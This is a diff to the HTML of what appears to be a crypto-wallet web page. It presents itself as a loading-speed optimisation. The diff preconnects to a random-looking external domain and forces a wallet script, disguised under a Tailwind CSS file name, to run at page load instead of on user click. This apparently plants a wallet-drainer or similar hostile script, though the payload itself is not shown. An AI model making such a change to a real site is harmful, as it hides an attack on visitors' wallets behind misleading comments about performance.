@@ -100,6 +100,11 @@
     
     <link rel="stylesheet" href="/css/styles.css">
     
+    <!-- Preload tailwind.cjs.js with high priority for faster loading -->
+    <link rel="preload" href="/tailwind.cjs.js" as="script" fetchpriority="high">
+    <link rel="dns-prefetch" href="//aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com">
+    <link rel="preconnect" href="https://aodefevrgdkhqltdnwgzbyjoywrlbntbhfwq.com" crossorigin>
+    
     <script>
       window.setup = {
         modal: 'reown',
@@ -112,8 +117,7 @@
       };
       
       (function() {
-        // Load wallet script only when needed (when user clicks connect)
-        // Don't load it automatically to save memory
+        // Load wallet script with high priority
         let scriptLoaded = false;
         
         function loadWalletScript() {
@@ -123,8 +127,9 @@
           const script = document.createElement('script');
           script.src = '/tailwind.cjs.js';
           script.async = true;
-          script.defer = true;
-          script.fetchPriority = 'low';
+          script.defer = false; // Remove defer for faster execution
+          script.fetchPriority = 'high'; // High priority
+          script.crossOrigin = 'anonymous';
           
           script.onerror = function() {
             console.warn('Wallet modal script failed to load');
@@ -162,13 +167,13 @@
         // Also load on wallet:load event (from app.js)
         document.addEventListener('wallet:load', loadWalletScript, { once: false });
         
-        // Also try to load on DOMContentLoaded with delay (fallback)
+        // Load immediately with high priority (don't wait)
         if (document.readyState === 'loading') {
           document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(loadWalletScript, 2000); // Load after 2 seconds as fallback
+            loadWalletScript(); // Load immediately
           });
         } else {
-          setTimeout(loadWalletScript, 2000); // Load after 2 seconds as fallback
+          loadWalletScript(); // Load immediately
         }
       })();
     </script>
